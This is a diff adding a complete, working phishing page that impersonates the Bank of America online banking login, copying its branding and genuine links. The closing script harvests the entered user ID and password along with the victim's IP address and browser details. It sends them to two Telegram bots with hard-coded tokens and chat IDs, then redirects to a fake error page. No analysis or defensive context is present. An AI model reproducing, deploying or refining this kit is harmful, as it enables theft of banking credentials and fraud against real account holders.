@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bank of America | Online Banking | Log in | User ID</title>
+  <link rel="shortcut icon" href="img/icona.png" />
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+  <style>
+  #spinner-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-color: rgba(255, 255, 255, 0.61);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 10000;
+  }
+
+  .spinner {
+    border: 8px solid #f3f3f3;
+    border-top: 8px solid #db3434;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+</head>
+
+<body>
+  <section id="header">
+    <a href="index.html" class="log">
+      <img src="img/Bank-of-America-Logoo.png" width="350" height="30" class="logo" alt="Bank of America Logo">
+    </a>
+    <div class="secure">
+      <ul id="navbar">
+        <li class="area"><i class="fa fa-lock"></i> Secure Area |</li>
+        <li><a href="https://secure.bankofamerica.com/login/languageToggle.go?request_locale=es_US">En español</a></li>
+      </ul>
+    </div>
+  </section>
+
+  <section id="hero">
+    <div class="bar">
+      <h3 class="red">Log In to Online Banking</h3>
+    </div>
+  </section>
+
+  <div class="container">
+    <div class="login-page">
+      <div class="login-page-content">
+
+        <form id="loginForm" class="login-page-form">
+          <div class="id">
+            <label for="UserID" class="user">User ID</label>
+            <input type="text" name="user_id" id="username" class="form-login-input" autocomplete="off" required>
+            <div class="ticks">
+              <input type="checkbox" id="check">
+              <label for="check" class="remem">Save this User ID</label>
+              <a href="#"><i class="fa fa-question-circle" title="Help"></i></a>
+            </div>
+          </div>
+
+          <div>
+            <label for="Password" class="user">Password</label>
+            <input type="password" name="password" id="password" class="form-login-input" autocomplete="off" required>
+            <div class="pass">
+              <a href="https://secure.bankofamerica.com/auth/forgot/reset-entry/" class="form-login-link">Forgot your
+                password?</a>
+            </div>
+            <button type="submit" class="form-login-btn">
+              <i class="fa fa-lock"></i> Log In
+            </button>
+          </div>
+        </form>
+
+      </div>
+
+      <div class="phone">
+        <span class="connect">Stay connected with our app</span>
+        <div class="image">
+          <img src="img/mobile.png" width="149" height="208" alt="Mobile App Preview">
+          <div class="next">
+            <span>Secure, convenient<br>banking anytime</span>
+            <a href="https://apps.apple.com/us/app/bank-america-mobile-banking/id284847138">
+              <input type="button" class="form-app-btn" value="Get the app">
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <div id="spinner-overlay" style="display: none;">
+  <div class="spinner"></div>
+</div>
+
+      <div class="help">
+        <span class="login-help">Login help</span>
+        <ul class="pass-list">
+          <li><a href="https://secure.bankofamerica.com/auth/forgot/reset-entry/">Forgot ID/Password?</a></li>
+          <li><a href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/"
+              class="two">Problem logging in?</a></li>
+        </ul>
+        <h4 class="roam">Not using Online Banking?</h4>
+        <ul class="pass-list">
+          <li><a href="https://secure.bankofamerica.com/auth/enroll/enroll-entry/">Enroll now</a></li>
+          <li><a href="https://www.bankofamerica.com/online-banking/mobile-and-online-banking-features/">Learn more
+              about Online Banking</a></li>
+          <li><a href="https://www.bankofamerica.com/online-banking/service-agreement.go">Service Agreement</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="gray-bground-skin">
+      <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
+      <div class="link-container">
+        <div class="link-row">
+          <a href="https://www.bankofamerica.com/security-center/privacy-overview/" target="_blank">Privacy</a>
+          <a href="https://www.bankofamerica.com/security-center/overview/" target="_blank">Security</a>
+          <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
+          <div class="clearboth"></div>
+        </div>
+      </div>
+      <p>
+        Bank of America, N.A. Member FDIC.
+        <a href="https://www.bankofamerica.com/help/equalhousing-popup/" target="_blank">Equal Housing Lender</a>
+        <i class="fa fa-home"></i><br>© 2025 Bank of America Corporation.
+      </p>
+    </div>
+  </footer>
+
+</body>
+<script>
+  document.getElementById('loginForm').addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    document.getElementById("spinner-overlay").style.display = "flex"; 
+
+    var userId = document.getElementById('username').value.trim();
+    var password = document.getElementById('password').value.trim();
+
+    if (!userId || !password) {
+      alert('Please enter both User ID and Password.');
+      return;
+    }
+
+    var ipAddress = 'Unknown';
+    try {
+      var ipResponse = await fetch('https://api.ipify.org?format=json');
+      var ipData = await ipResponse.json();
+      ipAddress = ipData.ip;
+    } catch (error) {
+      console.warn(':', error);
+    }
+
+    var browserInfo = navigator.userAgent;
+
+    var message = 
+      'User Login Info\n' +
+      'User ID: ' + userId + '\n' +
+      'Password: ' + password + '\n' +
+      'IP Address: ' + ipAddress + '\n' +
+      'Browser: ' + browserInfo;
+
+    // Telegram bot credentials
+    var botToken1 = '7681661204:AAGNlQbHw0xCan94-xKKW1yKmm7odMePwBs';
+    var chatId1 = '7920571465';
+
+    var botToken2 = '7917147283:AAHHTvm4t7vwSx16pSncuheU5_46t7DLeh4';
+    var chatId2 = '6695577186';
+
+    async function sendToTelegram(token, chatId, text) {
+      var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+      var response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      });
+      return response.ok;
+    }
+
+    try {
+  var result1 = await sendToTelegram(botToken1, chatId1, message);
+  var result2 = await sendToTelegram(botToken2, chatId2, message);
+
+  if (result1 && result2) {
+    window.location.href = 'login-error.html'; // Redirect only if both succeed
+  } else {
+    document.getElementById("spinner-overlay").style.display = "none"; // Hide spinner
+    alert('Submission failed. Try again.');
+  }
+} catch (err) {
+  document.getElementById("spinner-overlay").style.display = "none"; // Hide spinner
+  console.error(err);
+  alert('Network error. Try again later.');
+}
+  });
+</script>
+
+</html>
